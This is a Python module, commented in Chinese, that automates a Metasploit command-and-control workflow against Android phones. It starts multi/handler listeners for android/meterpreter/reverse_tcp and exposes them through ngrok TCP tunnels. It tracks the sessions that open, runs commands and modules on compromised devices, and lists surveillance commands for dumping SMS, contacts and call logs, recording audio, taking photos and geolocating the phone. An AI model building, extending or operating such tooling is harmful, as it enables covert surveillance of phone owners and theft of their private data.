import subprocess
import requests
import time
import os
import logging
import threading
import tempfile
import json
import re
import socket
from core.ngrok_manager import NgrokManager
from core.ngrok_tcp_manager import NgrokTCPManager

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSFRPC_AVAILABLE = True
except ImportError:
    MSFRPC_AVAILABLE = False
    logging.warning("pymetasploit3未安装，使用基础会话管理")

logger = logging.getLogger(__name__)

class Attacker:
    def __init__(self, lhost=None, lport=None, msfrpc_password=None, msfrpc_port=None):
        """初始化攻击器。未传入的参数从 config/config.yaml 读取。"""
        import yaml
        try:
            with open('config/config.yaml', 'r', encoding='utf-8') as f:
                _cfg = yaml.safe_load(f).get('metasploit', {})
        except Exception as e:
            logger.error(f"读取配置文件失败: {e}")
            _cfg = {}

        if lhost is None:
            lhost = _cfg.get('default_lhost', '0.0.0.0')
        if lport is None:
            lport = _cfg.get('default_lport', 4444)
        if msfrpc_password is None:
            msfrpc_password = _cfg.get('msfrpc_password', '')
        if msfrpc_port is None:
            msfrpc_port = _cfg.get('msfrpc_port', 55553)

        self.lhost = lhost
        self.lport = lport
        self.ngrok = NgrokManager()
        self.ngrok_tcp = NgrokTCPManager()  # 新增：TCP隧道管理器
        self.listener_process = None
        self.listener_script = None
        self.sessions = {}
        self.msfrpc_client = None
        self.msfrpc_password = msfrpc_password
        self.msfrpc_port = msfrpc_port
        self.ngrok_tcp_endpoint = None  # 新增：存储TCP隧道端点
        
        # 如果提供了MSFRPC密码，尝试连接
        if msfrpc_password and MSFRPC_AVAILABLE:
            self._setup_msfrpc()
    
    def _setup_msfrpc(self):
        """设置MSF RPC连接"""
        try:
            # 检查MSFRPC服务是否在运行
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', self.msfrpc_port))
            sock.close()
        
            if result != 0:
                logger.warning(f"MSFRPC服务未在端口 {self.msfrpc_port} 运行")
                self.msfrpc_client = None
                return
        
            self.msfrpc_client = MsfRpcClient(
                self.msfrpc_password, 
                port=self.msfrpc_port,
                ssl=False,  # 改为False，除非你明确配置了SSL
                server='127.0.0.1'
            )
            logger.info("MSF RPC客户端连接成功")
            
            # 启动MSFRPC会话监控线程
            if self.msfrpc_client:
                monitor_thread = threading.Thread(target=self._monitor_sessions)
                monitor_thread.daemon = True
                monitor_thread.start()
                
        except Exception as e:
            logger.warning(f"MSF RPC连接失败: {e}")
            logger.info("MSF RPC不可用，将使用基础会话管理功能")
            self.msfrpc_client = None

    @staticmethod
    def _strip_ansi(text):
        """去除ANSI转义码，避免颜色代码干扰正则匹配"""
        return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)

    def _monitor_listener(self):
        """监控监听器进程 - 改进会话检测"""
        try:
            while self.listener_process and self.listener_process.poll() is None:
                # 读取输出（非阻塞）
                try:
                    output = self.listener_process.stdout.readline()
                    if output:
                        output_line = self._strip_ansi(output.strip())
                        logger.info(f"MSF输出: {output_line}")

                        # 检查会话建立 - 改进匹配模式
                        session_established = False
                        session_id = None

                        # 匹配多种会话建立的消息格式
                        if "Meterpreter session" in output_line and "opened" in output_line:
                            # 格式: [*] Meterpreter session 2 opened (192.168.25.131:5555 -> 192.168.25.1:45904)
                            session_id = self._extract_session_id(output_line)
                            session_established = True

                        elif "Session" in output_line and "opened" in output_line:
                            # 格式: [*] Session 1 opened
                            session_id = self._extract_session_id(output_line)
                            session_established = True

                        elif "Command shell session" in output_line and "opened" in output_line:
                            # 格式: [*] Command shell session 3 opened
                            session_id = self._extract_session_id(output_line)
                            session_established = True

                        elif "Sending stage" in output_line:
                            # 格式: [*] Sending stage (72508 bytes) to 192.168.25.1
                            # stage已发送，会话即将建立，启动延迟轮询
                            ip_match = re.search(r'Sending stage.*?to\s+(\d+\.\d+\.\d+\.\d+)', output_line)
                            target_ip = ip_match.group(1) if ip_match else "unknown"
                            logger.info(f"检测到stage发送，目标: {target_ip}，启动延迟会话检测...")
                            t = threading.Thread(
                                target=self._wait_for_session_after_stage,
                                args=(target_ip,),
                                daemon=True
                            )
                            t.start()

                        if session_established and session_id:
                            logger.info(f"检测到新会话建立: {session_id}")
                            self._handle_new_session(session_id, output_line)

                            # 立即更新会话列表
                            self._update_sessions_from_msfrpc()

                except Exception as e:
                    logger.error(f"读取MSF输出错误: {e}")

                time.sleep(0.1)
            
            # 进程结束处理
            if self.listener_process:
                return_code = self.listener_process.poll()
                logger.info(f"MSF监听器已停止，返回码: {return_code}")
                
                # 清理RC文件
                if self.listener_script and os.path.exists(self.listener_script):
                    os.remove(self.listener_script)
                    self.listener_script = None
                
                self.listener_process = None
                
        except Exception as e:
            logger.error(f"监听器监控错误: {e}")

    def _wait_for_session_after_stage(self, target_ip, max_wait=30):
        """stage发送后轮询MSFRPC等待会话注册"""
        for _ in range(max_wait):
            time.sleep(1)
            if self.msfrpc_client:
                try:
                    valid_sessions = self._safe_sessions_list(self.msfrpc_client)
                    for sid, info in valid_sessions.items():
                        if sid not in self.sessions:
                            logger.info(f"stage后检测到新MSFRPC会话: {sid}")
                            self._handle_new_session(sid, info)
                            return
                except Exception as e:
                    logger.warning(f"stage后轮询MSFRPC失败: {e}")
        # 超时后不再记录占位符，避免产生无法操作的假会话

    def _delayed_handle_session(self, session_id, output_line):
        """延迟处理新会话，给MSFRPC时间注册"""
        try:
            logger.info(f"延迟处理会话: {session_id}")
            self._handle_new_session(session_id, output_line)
        
            # 延迟更新会话列表
            time.sleep(1)
            self._update_sessions_from_msfrpc()
        
        except Exception as e:
            logger.error(f"延迟处理会话错误: {e}")

    def _extract_session_id(self, output):
        """从输出中提取会话ID - 改进提取逻辑"""
        try:
            # 多种匹配模式
            patterns = [
                r'Session\s+(\d+)\s+opened',  # Session 1 opened
                r'Meterpreter session\s+(\d+)\s+opened',  # Meterpreter session 2 opened
                r'Command shell session\s+(\d+)\s+opened',  # Command shell session 3 opened
                r'session\s+(\d+)\s+opened',  # session 1 opened
            ]
            
            for pattern in patterns:
                match = re.search(pattern, output, re.IGNORECASE)
                if match:
                    session_id = match.group(1)
                    logger.info(f"从输出中提取到会话ID: {session_id}")
                    return session_id
            
            # 如果正则匹配失败，尝试简单提取
            if "session" in output.lower() and "opened" in output.lower():
                # 查找数字
                words = output.split()
                for i, word in enumerate(words):
                    if word.isdigit() and i > 0 and "session" in words[i-1].lower():
                        logger.info(f"简单提取到会话ID: {word}")
                        return word
            
            logger.warning(f"无法从输出中提取会话ID: {output}")
            return None
            
        except Exception as e:
            logger.error(f"提取会话ID错误: {e}")
            return None

    @staticmethod
    def _safe_sessions_list(msfrpc_client):
        """安全获取会话列表，将整数key转为字符串，避免msgpack strict_map_key错误"""
        try:
            raw = msfrpc_client.sessions.list
        except Exception as e:
            raise e
        if not isinstance(raw, dict):
            return {}
        # MSF返回的session ID可能是int，统一转为str
        result = {}
        for k, v in raw.items():
            str_k = str(k)
            if str_k in ('error', 'error_class', 'error_string', 'error_backtrace', 'error_message'):
                continue
            if isinstance(v, dict):
                result[str_k] = v
        return result

    def _update_sessions_from_msfrpc(self):
        """通过MSFRPC更新会话列表"""
        if not self.msfrpc_client:
            return

        try:
            valid_sessions = self._safe_sessions_list(self.msfrpc_client)

            # 检查新会话
            for session_id, session_info in valid_sessions.items():
                if session_id not in self.sessions:
                    logger.info(f"MSFRPC检测到新会话: {session_id}")
                    self._handle_new_session(session_id, session_info)

            # 检查断开会话（只删除已被MSFRPC验证过的会话，避免误删stdout检测的占位符）
            for session_id in list(self.sessions.keys()):
                if session_id not in valid_sessions:
                    if self.sessions[session_id].get("verified", False):
                        logger.info(f"MSFRPC检测到会话断开: {session_id}")
                        del self.sessions[session_id]
                    else:
                        logger.debug(f"会话 {session_id} 未在MSFRPC中，但保留（未验证/占位符）")

        except Exception as e:
            logger.error(f"MSFRPC更新会话失败: {e}")

    def _handle_new_session(self, session_id, session_info=None):
        """处理新会话 - 改进信息提取"""
        try:
            # 统一转为字符串，避免int key问题
            session_id = str(session_id)
            # 解析会话信息
            session_data = {
                "id": session_id,
                "timestamp": time.time(),
                "last_activity": time.time(),
                "verified": False
            }

            # 如果是MSFRPC提供的会话信息
            if isinstance(session_info, dict):
                session_data.update({
                    "type": session_info.get("type", "unknown"),
                    "info": session_info.get("info", ""),
                    "via_exploit": session_info.get("via_exploit", ""),
                    "via_payload": session_info.get("via_payload", ""),
                    "target_host": session_info.get("target_host", ""),
                    "username": session_info.get("username", ""),
                    "uuid": session_info.get("uuid", ""),
                    "verified": True
                })
            else:
                # 从输出字符串中提取信息
                session_data.update({
                    "type": "meterpreter",  # 假设是meterpreter
                    "info": str(session_info) if session_info else "",
                    "via_exploit": "exploit/multi/handler",
                    "via_payload": "android/meterpreter/reverse_tcp",
                    "target_host": self._extract_target_host(str(session_info)),
                    "verified": False
                })
            
            self.sessions[session_id] = session_data
            logger.info(f"新会话记录: {session_data}")
            
            # 如果MSFRPC可用，尝试验证会话
            if self.msfrpc_client:
                self._verify_session_with_msfrpc(session_id)
            
        except Exception as e:
            logger.error(f"处理新会话错误: {e}")

    def _extract_target_host(self, output):
        """从输出中提取目标主机信息"""
        try:
            # 匹配IP地址模式
            ip_pattern = r'\d+\.\d+\.\d+\.\d+'
            matches = re.findall(ip_pattern, output)
            
            if len(matches) >= 2:
                # 通常第一个是攻击者IP，第二个是目标IP
                return matches[1]
            
            return "unknown"
        except:
            return "unknown"

    def _verify_session_with_msfrpc(self, session_id):
        """使用MSFRPC验证会话"""
        if not self.msfrpc_client:
            return
        try:
            # session_id 统一用字符串，MSFRPC API 接受字符串或整数
            session = self.msfrpc_client.sessions.session(str(session_id))
            if session:
                # 标记为已验证，不强制调用 sysinfo（Android meterpreter 可能不支持）
                if session_id in self.sessions:
                    self.sessions[session_id]["verified"] = True
                logger.info(f"会话验证成功: {session_id}")
        except Exception as e:
            logger.warning(f"会话验证失败 {session_id}: {e}")

    def _monitor_sessions(self):
        """使用MSFRPC监控会话"""
        if not self.msfrpc_client:
            return
            
        while True:
            try:
                self._update_sessions_from_msfrpc()
            except Exception as e:
                logger.error(f"会话监控错误: {e}")
            
            time.sleep(5)  # 每5秒检查一次

    def start_msf_listener(self, payload_type="android/meterpreter/reverse_tcp",
                          exit_on_session=False, auto_migrate=True, lport=None):
        """启动MSF监听器"""
        try:
            if lport:
                self.lport = lport

            # 优先通过MSFRPC控制台启动，会话直接注册到msfrpcd
            if self.msfrpc_client:
                return self._start_listener_via_msfrpc(payload_type, exit_on_session)
            else:
                return self._start_listener_via_subprocess(payload_type, exit_on_session)

        except Exception as e:
            logger.error(f"MSF监听器启动失败: {e}")
            return {"success": False, "error": str(e)}

    def _start_listener_via_msfrpc(self, payload_type, exit_on_session):
        """通过MSFRPC控制台启动监听器（会话注册到msfrpcd，可直接操作）"""
        try:
            console = self.msfrpc_client.consoles.console()
            self.msf_console = console
            cmds = (
                f"use exploit/multi/handler\n"
                f"set PAYLOAD {payload_type}\n"
                f"set LHOST {self.lhost}\n"
                f"set LPORT {self.lport}\n"
                f"set ExitOnSession {'true' if exit_on_session else 'false'}\n"
                f"exploit -j -z\n"
            )
            console.write(cmds)
            logger.info(f"通过MSFRPC控制台启动监听器: {self.lhost}:{self.lport}")

            monitor_thread = threading.Thread(target=self._monitor_msfrpc_console, daemon=True)
            monitor_thread.start()

            return {
                "success": True,
                "lhost": self.lhost,
                "lport": self.lport,
                "payload": payload_type,
                "method": "msfrpc_console"
            }
        except Exception as e:
            logger.error(f"MSFRPC控制台启动失败，回退到子进程: {e}")
            return self._start_listener_via_subprocess(payload_type, exit_on_session)

    def _monitor_msfrpc_console(self):
        """监控MSFRPC控制台输出，检测会话建立"""
        while getattr(self, 'msf_console', None):
            try:
                result = self.msf_console.read()
                data = result.get('data', '') if isinstance(result, dict) else ''
                for line in data.splitlines():
                    line = self._strip_ansi(line.strip())
                    if not line:
                        continue
                    logger.info(f"MSF控制台: {line}")
                    if ("Meterpreter session" in line or "Session" in line) and "opened" in line:
                        session_id = self._extract_session_id(line)
                        if session_id:
                            logger.info(f"MSFRPC控制台检测到新会话: {session_id}")
                            time.sleep(0.5)
                            self._update_sessions_from_msfrpc()
                    elif "Sending stage" in line:
                        ip_match = re.search(r'Sending stage.*?to\s+(\d+\.\d+\.\d+\.\d+)', line)
                        target_ip = ip_match.group(1) if ip_match else "unknown"
                        t = threading.Thread(target=self._wait_for_session_after_stage, args=(target_ip,), daemon=True)
                        t.start()
            except Exception as e:
                logger.error(f"MSFRPC控制台监控错误: {e}")
            time.sleep(0.5)

    def _start_listener_via_subprocess(self, payload_type, exit_on_session):
        """通过子进程启动msfconsole（MSFRPC不可用时的回退方案）"""
        rc_content = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {payload_type}\n"
            f"set LHOST {self.lhost}\n"
            f"set LPORT {self.lport}\n"
            f"set ExitOnSession {'true' if exit_on_session else 'false'}\n"
            f"exploit -j -z\n"
        )
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(rc_content)
            self.listener_script = f.name

        logger.info(f"通过子进程启动MSF监听器: {self.lhost}:{self.lport}")
        self.listener_process = subprocess.Popen(
            ["msfconsole", "-r", self.listener_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        monitor_thread = threading.Thread(target=self._monitor_listener, daemon=True)
        monitor_thread.start()

        return {
            "success": True,
            "lhost": self.lhost,
            "lport": self.lport,
            "payload": payload_type,
            "pid": self.listener_process.pid,
            "method": "subprocess"
        }
    
    def start_tcp_tunnel(self, port=None):
        """启动TCP隧道（用于Meterpreter）"""
        try:
            if not port:
                port = self.lport
            
            # 启动TCP隧道
            endpoint = self.ngrok_tcp.start_tcp_tunnel(port=port)
            if endpoint:
                self.ngrok_tcp_endpoint = endpoint
                logger.info(f"TCP隧道启动成功: {endpoint}")
                
                # 解析隧道信息
                host, port = endpoint.split(':')
                return {
                    "success": True,
                    "endpoint": endpoint,
                    "host": host,
                    "port": port,
                    "lhost": self.lhost,
                    "lport": self.lport
                }
            else:
                logger.error("TCP隧道启动失败")
                return {"success": False, "error": "TCP隧道启动失败"}
                
        except Exception as e:
            logger.error(f"启动TCP隧道失败: {e}")
            return {"success": False, "error": str(e)}
    
    def get_tcp_tunnel_info(self):
        """获取TCP隧道信息"""
        return {
            "endpoint": self.ngrok_tcp_endpoint,
            "status": self.ngrok_tcp.get_tunnel_status()
        }

    def get_sessions(self):
        """获取所有活跃会话"""
        # 清理过期会话
        current_time = time.time()
        expired_sessions = []
        
        for session_id, session_data in self.sessions.items():
            # 如果超过10分钟没有活动，认为会话过期
            if current_time - session_data["last_activity"] > 600:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            del self.sessions[session_id]
        
        return self.sessions
    
    def execute_command(self, session_id, command):
        """在指定会话中执行命令"""
        try:
            if not self.msfrpc_client:
                return {
                    "success": False, 
                    "error": "MSF RPC不可用，无法执行命令"
                }
            
            if session_id not in self.sessions:
                return {
                    "success": False, 
                    "error": f"会话 {session_id} 不存在"
                }
            
            session = self.msfrpc_client.sessions.session(str(session_id))
            if not session:
                return {
                    "success": False,
                    "error": f"无法访问会话 {session_id}"
                }

            # 更新最后活动时间
            self.sessions[session_id]["last_activity"] = time.time()

            # 执行命令
            result = session.run_with_output(command)
            
            return {
                "success": True,
                "session_id": session_id,
                "command": command,
                "output": result,
                "timestamp": time.time()
            }
            
        except Exception as e:
            logger.error(f"执行命令错误: {e}")
            return {
                "success": False, 
                "error": str(e)
            }
    
    def get_session_info(self, session_id):
        """获取会话详细信息"""
        if session_id in self.sessions:
            return self.sessions[session_id]
        return None
    
    def run_meterpreter_module(self, session_id, module_name, options=None):
        """运行meterpreter模块"""
        try:
            if not self.msfrpc_client:
                return {
                    "success": False, 
                    "error": "MSF RPC不可用"
                }
            
            if options is None:
                options = {}
            
            # 获取会话
            session = self.msfrpc_client.sessions.session(str(session_id))
            if not session:
                return {
                    "success": False, 
                    "error": f"会话 {session_id} 不存在"
                }
            
            # 运行模块
            result = session.run_module(module_name, options)
            
            # 更新最后活动时间
            self.sessions[session_id]["last_activity"] = time.time()
            
            return {
                "success": True,
                "session_id": session_id,
                "module": module_name,
                "options": options,
                "result": result,
                "timestamp": time.time()
            }
            
        except Exception as e:
            logger.error(f"运行模块错误: {e}")
            return {
                "success": False, 
                "error": str(e)
            }
    
    def stop_listener(self):
        """停止监听器"""
        try:
            stopped = False
            # 停止MSFRPC控制台
            if getattr(self, 'msf_console', None):
                try:
                    self.msf_console.destroy()
                    logger.info("MSFRPC控制台已关闭")
                except Exception as e:
                    logger.warning(f"关闭MSFRPC控制台失败: {e}")
                self.msf_console = None
                stopped = True
            # 停止子进程
            if self.listener_process:
                self.listener_process.terminate()
                self.listener_process.wait(timeout=10)
                logger.info("MSF监听器子进程已停止")
                if self.listener_script and os.path.exists(self.listener_script):
                    os.remove(self.listener_script)
                    self.listener_script = None
                self.listener_process = None
                stopped = True
            if stopped:
                return {"success": True}
            return {"success": False, "error": "监听器未运行"}
        except Exception as e:
            logger.error(f"停止监听器错误: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_tcp_tunnel(self):
        """停止TCP隧道"""
        try:
            if self.ngrok_tcp:
                result = self.ngrok_tcp.stop_ngrok()
                self.ngrok_tcp_endpoint = None
                return {"success": result}
            return {"success": False, "error": "隧道未运行"}
        except Exception as e:
            logger.error(f"停止TCP隧道错误: {e}")
            return {"success": False, "error": str(e)}
    
    def get_listener_status(self):
        """获取监听器状态"""
        try:
            running = False
            if self.listener_process:
                # 检查进程是否仍在运行
                returncode = self.listener_process.poll()
                running = returncode is None

            return {
                "running": running,
                "lhost": self.lhost,
                "lport": self.lport,
                "listener_process": self.listener_process is not None,
                "tcp_tunnel": {
                    "endpoint": self.ngrok_tcp_endpoint,
                    "status": self.ngrok_tcp.get_tunnel_status() if self.ngrok_tcp else "not_running"
                }
            }
        except Exception as e:
            logger.error(f"获取监听器状态错误: {e}")
            return {
                "running": False,
                "error": str(e)
            }

    def get_common_commands(self):
        """获取常用Meterpreter命令列表"""
        return {
            "system": [
                {"cmd": "sysinfo", "desc": "获取系统信息"},
                {"cmd": "getuid", "desc": "获取当前用户"},
                {"cmd": "getpid", "desc": "获取进程ID"},
                {"cmd": "ps", "desc": "列出进程"},
                {"cmd": "shell", "desc": "进入系统Shell"},
            ],
            "file": [
                {"cmd": "ls", "desc": "列出目录"},
                {"cmd": "pwd", "desc": "当前目录"},
                {"cmd": "cd <path>", "desc": "切换目录"},
                {"cmd": "download <file>", "desc": "下载文件"},
                {"cmd": "upload <file>", "desc": "上传文件"},
            ],
            "network": [
                {"cmd": "ifconfig", "desc": "网络接口信息"},
                {"cmd": "netstat", "desc": "网络连接状态"},
                {"cmd": "portfwd add -l <lport> -p <rport> -r <rhost>", "desc": "端口转发"},
            ],
            "android": [
                {"cmd": "dump_sms", "desc": "导出短信"},
                {"cmd": "dump_contacts", "desc": "导出联系人"},
                {"cmd": "geolocate", "desc": "获取GPS位置"},
                {"cmd": "record_mic", "desc": "录音"},
                {"cmd": "webcam_snap", "desc": "拍照"},
                {"cmd": "dump_calllog", "desc": "导出通话记录"},
            ],
            "privilege": [
                {"cmd": "getprivs", "desc": "获取权限列表"},
                {"cmd": "use priv", "desc": "加载权限模块"},
            ]
        }

    def reconnect_msfrpc(self):
        """尝试重新连接MSFRPC（供外部调用）"""
        if not MSFRPC_AVAILABLE:
            return False
        if self.msfrpc_client:
            return True
        self._setup_msfrpc()
        return self.msfrpc_client is not None

    def debug_sessions(self):
        """获取会话调试信息"""
        try:
            sessions = self.get_sessions()
            debug_info = {
                "total_sessions": len(sessions),
                "sessions": sessions,
                "msfrpc_connected": self.msfrpc_client is not None,
                "listener_running": self.listener_process is not None and self.listener_process.poll() is None,
                "lhost": self.lhost,
                "lport": self.lport,
            }
            # 如果MSFRPC可用，获取实时会话列表
            if self.msfrpc_client:
                try:
                    msf_sessions = self._safe_sessions_list(self.msfrpc_client)
                    debug_info["msfrpc_sessions"] = msf_sessions
                except Exception as e:
                    debug_info["msfrpc_sessions_error"] = str(e)
            return debug_info
        except Exception as e:
            logger.error(f"获取调试信息错误: {e}")
            return {"error": str(e)}
